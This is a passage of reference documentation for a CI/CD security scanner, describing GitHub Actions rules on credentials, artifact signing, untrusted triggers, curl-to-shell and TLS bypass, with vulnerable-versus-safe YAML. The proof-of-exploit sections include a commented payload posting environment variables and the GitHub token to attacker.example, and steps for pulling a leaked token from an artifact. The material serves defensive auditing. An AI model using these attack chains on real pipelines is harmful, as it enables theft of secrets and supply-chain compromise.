### `GHA-005`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-005 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` secrets in GitHub Actions can't be rotated on a fine-grained schedule and remain valid until manually revoked. OIDC with `role-to-assume` yields short-lived credentials per workflow run.

**Recommendation.** Use `aws-actions/configure-aws-credentials` with `role-to-assume` + `permissions: id-token: write` to obtain short-lived credentials via OIDC. Remove the static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- LocalStack and Moto integration tests set ``AWS_ENDPOINT_URL`` to a localhost address and use the sentinel ``test`` / ``test`` access keys (the LocalStack convention). Those values can't authenticate against real AWS, so the rule auto-suppresses an env block that pairs a localhost endpoint with sentinel keys.

**Source:** [`GHA-005`](../providers/github.md#gha-005) in the [GitHub Actions provider](../providers/github.md).

### `GHA-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-006 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step, e.g. `sigstore/cosign-installer` followed by `cosign sign`, or `slsa-framework/slsa-github-generator` for keyless SLSA provenance. Publish the signature alongside the artifact and verify it at consumption time.

**Seen in the wild.**

- [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): SUNBURST trojanized builds shipped to ~18,000 customers because no post-build signature could be checked against a trusted signing identity. Cryptographic signing on every release would have given downstream consumers a verifiable break with the upstream key, the absence of which was the ambient signal of compromise.
- [PyTorch nightly compromise](https://pytorch.org/blog/compromised-nightly-dependency/) (December 2022): the ``torchtriton`` dependency was hijacked via PyPI dependency-confusion. Sigstore-style attestation tied to the official publisher would have made the impostor build fail verification rather than silently install.

**Source:** [`GHA-006`](../providers/github.md#gha-006) in the [GitHub Actions provider](../providers/github.md).

### `GHA-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-007 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `anchore/sbom-action`, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the release so consumers can ingest it into their vuln-management pipeline.

**Source:** [`GHA-007`](../providers/github.md#gha-007) in the [GitHub Actions provider](../providers/github.md).

### `GHA-008`: Credential-shaped literal in workflow body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-008 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Every string in the workflow is scanned against a set of credential patterns (AWS access keys, GitHub tokens, Slack tokens, JWTs, Stripe, Google, Anthropic, etc., see `--man secrets` for the full catalog). A match means a secret was pasted into YAML, the value is visible in every fork and every build log and must be treated as compromised.

A second key-context pass also fires on a 40-character lowercase-hex value bound to a credential-named YAML key (``API_TOKEN: deadbeef...0ddf00d``). Covers the legacy unprefixed-vendor-token family (Datadog, GitLab v1 PATs, Codecov v3, AppVeyor, CircleCI v1, pre-``ghp_`` GitHub PATs) where the bare hex shape carries no vendor prefix. The credential-key gate keeps commit SHAs and SHA-256 digests out of the false-positive bucket: a 40-hex value in ``deploy_commit:`` doesn't fire.

**Recommendation.** Rotate the exposed credential immediately. Move the value to an encrypted repository or environment secret and reference it via `${{ secrets.NAME }}`. For cloud access, prefer OIDC federation over long-lived keys.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real workflow it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Seen in the wild.**

- Uber 2016 GitHub leak: an AWS access key embedded in a private GitHub repo was reachable to attackers who got at the repo and used it to download driver / rider PII for 57 million accounts. Credential-shaped literals in any source control system (public or private) are one credential-leak away from the same outcome.
- GitGuardian's annual State of Secrets Sprawl reports consistently find millions of fresh credential leaks per year across public commits, with a median time-to-revocation after disclosure of days, not minutes. Pinning secrets to ``${{ secrets.* }}`` removes the artifact from source control entirely.

**Proof of exploit.**

```
# Vulnerable: AWS access key pasted into the workflow body.
env:
  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
  AWS_SECRET_ACCESS_KEY: wJalrXUtnnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Attack chain:
#  1. Attacker clones/forks the repo or pulls from a public
#     mirror. The literal is in plain text — no credentials
#     needed to read it.
#  2. Attacker uses the key against the AWS account it
#     belongs to. With AmazonEC2FullAccess this is
#     immediate compute hijack; with broader IAM it is
#     full data exfiltration.
#  3. Even after rotation, every git revision and every
#     CI build log retains the value — pull-request
#     mirrors, logging back-ends, and forks all have to
#     be scrubbed.

# Safe: reference a stored secret. The value never lives in
# source control or build logs (GitHub redacts it from output).
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

# Better: use OIDC federation. No long-lived key exists.
permissions:
  id-token: write
steps:
  - uses: aws-actions/configure-aws-credentials@<sha>
    with:
      role-to-assume: arn:aws:iam::123456789012:role/CIRole
      aws-region: us-east-1
```

**Source:** [`GHA-008`](../providers/github.md#gha-008) in the [GitHub Actions provider](../providers/github.md).

### `GHA-009`: workflow_run downloads upstream artifact unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-009 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** `on: workflow_run` runs in the privileged context of the default branch (write GITHUB_TOKEN, secrets accessible) but consumes artifacts produced by the triggering workflow, which is often a fork PR with no trust boundary. Classic PPE: a malicious PR uploads a tampered artifact, the privileged workflow_run downloads and executes it.

**Recommendation.** Add a verification step BEFORE consuming the artifact: `cosign verify-attestation --type slsaprovenance ...`, `gh attestation verify --owner $OWNER ./artifact`, or publish a checksum manifest from the trusted producer and `sha256sum -c` it. Treat any download from a fork as untrusted input.

**Source:** [`GHA-009`](../providers/github.md#gha-009) in the [GitHub Actions provider](../providers/github.md).

### `GHA-010`: Local action (./path) on untrusted-trigger workflow <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-010 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** `uses: ./path/to/action` resolves the action against the CHECKED-OUT workspace. On `pull_request_target` / `workflow_run`, that workspace can be PR-controlled, meaning the attacker supplies the `action.yml` that runs with default-branch privilege.

**Recommendation.** Move the action to a separate repo under your control and reference it by SHA-pinned `uses: org/repo@<sha>`, or split the workflow so the privileged work runs only on `pull_request` (read-only token, no secrets) where PR-controlled action.yml can't escalate.

**Proof of exploit.**

```
# Vulnerable: pull_request_target checks out the PR head
# (or skips checkout entirely and resolves the local action
# against the repo's current ref). Either way, a PR can
# modify ``./actions/lint-pr/action.yml`` and have its own
# action.yml execute with default-branch token + secrets in
# scope.
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: ./actions/lint-pr

# Safe: trigger on pull_request (read-only token, no
# repo secrets) so a PR-controlled action.yml can't
# escalate beyond what the PR head was already going to
# run anyway.
on:
  pull_request:
    types: [opened, synchronize]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: ./actions/lint-pr
```

**Source:** [`GHA-010`](../providers/github.md#gha-010) in the [GitHub Actions provider](../providers/github.md).

### `GHA-011`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-011 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** `actions/cache` restores by key (and falls through `restore-keys` on miss). When the key includes a value the attacker controls (PR title, head ref, workflow_dispatch input), an attacker can plant a poisoned cache entry that a later default-branch run restores and treats as a clean build cache.

**Recommendation.** Build the cache key from values the attacker can't control: `${{ runner.os }}`, `${{ hashFiles('**/*.lock') }}` (only when the lockfile is enforced by branch protection), and the workflow file path. Never include `github.event.*` PR/issue fields, `github.head_ref`, or `inputs.*` in the key namespace.

**Source:** [`GHA-011`](../providers/github.md#gha-011) in the [GitHub Actions provider](../providers/github.md).

### `GHA-012`: Self-hosted runner without ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-012 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Self-hosted runners that don't tear down between jobs leak filesystem and process state. A PR-triggered job writes to `/tmp`; a subsequent prod-deploy job on the same runner reads it. The mitigation is the runner's `--ephemeral` mode, the runner exits after one job and re-registers fresh. The check looks for an `ephemeral` label on the `runs-on` value; without one, the runner is presumed reusable. Recognizes all three `runs-on` shapes: string, list, and `{ group, labels }` dict form.

**Recommendation.** Configure the self-hosted runner to register with `--ephemeral` (the runner exits after one job and is freshly registered), and add an `ephemeral` label so this check can verify it. Consider actions-runner-controller for ephemeral pools.

**Known false positives.**

- Organisations using actions-runner-controller (ARC), autoscaled pools, or vendor runner fleets often use labels like ``arc-*``, ``autoscaled-*``, or ``ephemeral-pool-*`` instead of a bare ``ephemeral`` label. The check only matches the literal ``ephemeral`` token on ``runs-on``; extend via a custom allow-prefix config if your fleet uses a different naming convention. Defaults to MEDIUM confidence.

**Source:** [`GHA-012`](../providers/github.md#gha-012) in the [GitHub Actions provider](../providers/github.md).

### `GHA-013`: issue_comment trigger without author guard <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-013 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** `on: issue_comment` (and `discussion_comment`) fires for every comment on every issue or discussion in the repository. On public repos this means any GitHub user can trigger workflow execution. If the workflow runs commands, deploys, or accesses secrets, the attacker controls timing and can inject payloads through the comment body.

**Recommendation.** Add an `if:` condition that checks `github.event.comment.author_association` (e.g. `contains('OWNER MEMBER COLLABORATOR', ...)`), `github.event.sender.login`, or `github.actor` against an allowlist. Without a guard, any GitHub user can trigger the workflow by posting a comment.

**Known false positives.**

- Guard detection runs against the whole workflow as text rather than against parsed ``if:`` expressions, so a guard token appearing in an unrelated context (a comment, a step name, a description field) reads as satisfying the rule. Conversely, guards expressed via alternative author-association idioms the regex doesn't recognize (``github.event.issue.user.login``, an org-membership API check inside a script) leave the rule firing even though the workflow is safely gated. Suppress per-workflow via ``--ignore-file`` once you've verified the gate logic; tighten the guard expression to use the recognized tokens if possible.

**Proof of exploit.**

```
# Vulnerable: any GitHub user posts a comment ``/deploy``
# (or just any comment, since the if: doesn't gate on author)
# and the workflow runs with write-scope GITHUB_TOKEN.
on:
  issue_comment:
    types: [created]
jobs:
  ship:
    if: contains(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: ./scripts/deploy

# Safe: the if: gates on author association first; only
# OWNER / MEMBER / COLLABORATOR commenters can trigger.
on:
  issue_comment:
    types: [created]
jobs:
  ship:
    if: >
      contains(github.event.comment.body, '/deploy') &&
      contains('OWNER MEMBER COLLABORATOR',
               github.event.comment.author_association)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: ./scripts/deploy
```

**Source:** [`GHA-013`](../providers/github.md#gha-013) in the [GitHub Actions provider](../providers/github.md).

### `GHA-014`: Deploy job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-014 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment, [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** Without an `environment:` binding, a deploy job can't be gated by required reviewers, deployment-branch policies, or wait timers. Any push to the triggering branch will deploy immediately.

**Recommendation.** Add `environment: <name>` to jobs that deploy. Configure required reviewers, wait timers, and branch-protection rules on the matching GitHub environment.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Integration-test jobs that run ``terraform apply`` or ``kubectl apply`` against a local mock (LocalStack, Moto, kind, k3d) aren't real deploys. The rule auto-suppresses a step whose env carries ``AWS_ENDPOINT_URL`` or ``KUBE_API_URL`` pointing at a localhost address.

**Source:** [`GHA-014`](../providers/github.md#gha-014) in the [GitHub Actions provider](../providers/github.md).

### `GHA-015`: Job has no `timeout-minutes`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-015 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Without `timeout-minutes`, the job runs until GitHub's 6-hour default kills it. Explicit timeouts cap blast radius, cost, and the window during which a compromised step has access to secrets.

**Recommendation.** Add `timeout-minutes:` to each job, sized to the 95th percentile of historical runtime plus margin. GitHub's default is 360 minutes, an explicitly shorter value limits blast radius and runner cost.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-015`](../providers/github.md#gha-015) in the [GitHub Actions provider](../providers/github.md).

### `GHA-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-016 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a workflow. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Seen in the wild.**

- [Codecov Bash uploader compromise](https://about.codecov.io/security-update/) (April 2021): an attacker modified the codecov.io/bash uploader script (commonly fetched via ``curl -s codecov.io/bash | bash``) to exfiltrate environment variables from CI runners (AWS keys, GitHub tokens, signing keys) at thousands of customers for over two months before discovery.
- [event-stream](https://github.com/dominictarr/event-stream/issues/116) (November 2018) and the [ua-parser-js compromise](https://github.com/faisalman/ua-parser-js/issues/536) (October 2021): npm-side examples of the same primitive. When the CI runner executes bytes a third party can swap out (via `curl | bash`, an unpinned `npm install`, or a compromised maintainer account), the attacker controls what runs with the runner's credentials in scope. Pinning a digest or vendoring a frozen copy turns a perpetual ambient risk into a one-time review.

**Proof of exploit.**

```
# Vulnerable: install script piped straight to bash.
steps:
  - run: curl -sL https://example.com/install.sh | bash

# Attack: an attacker who controls the install.sh endpoint
# (compromised CDN, expired domain, BGP hijack, account
# takeover, or simply being the upstream maintainer with bad
# intent) drops a payload that runs in the CI runner with
# every secret available to the job:
#
#   #!/usr/bin/env bash
#   # legitimate-looking install actions...
#   curl -X POST https://attacker.example/exfil \
#     -d "$(env)" -d "$(cat $GITHUB_TOKEN_FILE 2>/dev/null)"
#
# The runner has no way to know the bytes changed.

# Safe: download, verify a known-good digest, then execute.
steps:
  - run: |
      curl -sLo install.sh https://example.com/install.sh
      echo "abc123...expected_sha256  install.sh" | sha256sum -c
      bash install.sh
```

**Source:** [`GHA-016`](../providers/github.md#gha-016) in the [GitHub Actions provider](../providers/github.md).

### `GHA-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-017 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a workflow give the container full access to the runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-017`](../providers/github.md#gha-017) in the [GitHub Actions provider](../providers/github.md).

### `GHA-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-018 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a workflow. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-018`](../providers/github.md#gha-018) in the [GitHub Actions provider](../providers/github.md).

### `GHA-019`: GITHUB_TOKEN written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-019 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Detects patterns where `GITHUB_TOKEN` is written to files, environment files (`$GITHUB_ENV`), or piped through `tee`. Persisted tokens survive the step boundary and can be exfiltrated by later steps, uploaded artifacts, or cache entries, turning a scoped credential into a long-lived one.

Carve-out: secrets leaked to the workflow log (via ``set -x`` shell trace, ``echo $TOKEN``, or URL-embedded credentials that a process tool logs) are GHA-033's domain, not GHA-019's. ``greylag-ci/cicd-goat`` scenario 27 fires GHA-033 only — the secret leaks to log via ``set -x`` but no token persists to file / ``$GITHUB_ENV`` / artifact, which is the persistence shape GHA-019 covers.

**Recommendation.** Never write GITHUB_TOKEN to files, artifacts, or GITHUB_ENV. Use the token inline via ${{ secrets.GITHUB_TOKEN }} in the step that needs it.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: token written to a file that survives the
# step boundary and lands in the upload-artifact bundle.
jobs:
  build:
    permissions: { contents: write, packages: write }
    steps:
      - run: echo "${{ secrets.GITHUB_TOKEN }}" > /tmp/token
      - run: make build                   # writes /tmp/token
                                          # into ./dist/
      - uses: actions/upload-artifact@<sha>
        with:
          name: build-output
          path: dist/

# Attack: any contributor (or, on public repos, anyone)
# downloads the artifact:
#
#   gh run download <run-id> -n build-output
#   cat build-output/tmp/token            # full GITHUB_TOKEN
#
# The token is scoped to the workflow's permissions block —
# in this case write to ``contents`` and ``packages``,
# enough to push tampered binaries to GHCR or rewrite the
# branch the workflow runs on. Composes with SCM-001
# (unprotected default branch) into XPC-004's "open a PR,
# fetch artifact, ship malicious binary" loop.

# Other persistence patterns the rule catches:
#   echo "TOKEN=$GITHUB_TOKEN" >> $GITHUB_ENV
#   echo "::set-output name=tok::$GITHUB_TOKEN"
#   echo "$SECRET" | tee /tmp/cache/secret

# Safe: use the token inline in the step that needs it; never
# write it anywhere that survives the step's environment:
      - run: gh release create v1.0.0 dist/*
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Source:** [`GHA-019`](../providers/github.md#gha-019) in the [GitHub Actions provider](../providers/github.md).

### `GHA-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-020 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`GHA-020`](../providers/github.md#gha-020) in the [GitHub Actions provider](../providers/github.md).

### `GHA-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-021 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-021`](../providers/github.md#gha-021) in the [GitHub Actions provider](../providers/github.md).

### `GHA-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-022 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`GHA-022`](../providers/github.md#gha-022) in the [GitHub Actions provider](../providers/github.md).

### `GHA-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-023 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: every git fetch in the job ignores certificate
# validity. An attacker on the same network (corporate proxy,
# hostile WiFi at a remote-dev's home, compromised mirror)
# returns a MITM-substituted clone of the dependency. The
# downstream build runs the attacker's code with the
# workflow's full secret + token set in scope.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: git config --global http.sslVerify false
      - run: git clone https://internal.example.com/lib.git
      - run: ./build

# Safe: install the missing CA chain so verification succeeds.
# If the upstream really uses a private CA, ship its root in
# the runner image rather than disabling verification for
# every host the job talks to.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          sudo cp ./ci/internal-ca.crt /usr/local/share/ca-certificates/
          sudo update-ca-certificates
      - run: git clone https://internal.example.com/lib.git
      - run: ./build
```

**Source:** [`GHA-023`](../providers/github.md#gha-023) in the [GitHub Actions provider](../providers/github.md).

### `GHA-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-024 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves ``who`` published it; a provenance attestation proves ``where/how`` it was built. Consumers can then verify the build happened on a trusted runner, from a specific source commit, with known parameters. Without it, a leaked signing key forges identity but a leaked build environment also forges provenance. You need both for the SLSA L3 non-falsifiability guarantee.

**Recommendation.** Call ``slsa-framework/slsa-github-generator`` or ``actions/attest-build-provenance`` after the build step to emit an in-toto attestation alongside the artifact. ``cosign sign`` alone (covered by GHA-006) signs the artifact but doesn't record *how* it was built. SLSA Build L3 requires the provenance statement.

**Source:** [`GHA-024`](../providers/github.md#gha-024) in the [GitHub Actions provider](../providers/github.md).

### `GHA-025`: Reusable workflow not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-025 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** A reusable workflow runs with the caller's ``GITHUB_TOKEN`` and secrets by default. If ``uses: org/repo/.github/workflows/release.yml@v1`` resolves to an attacker-modified commit, their code executes with your repository's permissions. This is the same threat model as unpinned step actions (GHA-001) but over a different ``uses:`` surface.

**Recommendation.** Pin every ``jobs.<id>.uses:`` reference to a 40-char commit SHA (``owner/repo/.github/workflows/foo.yml@<sha>``). Tag refs (``@v1``, ``@main``) can be silently repointed by whoever controls the callee repository.

**Source:** [`GHA-025`](../providers/github.md#gha-025) in the [GitHub Actions provider](../providers/github.md).

### `GHA-026`: Container job disables isolation via `options:` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-026 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

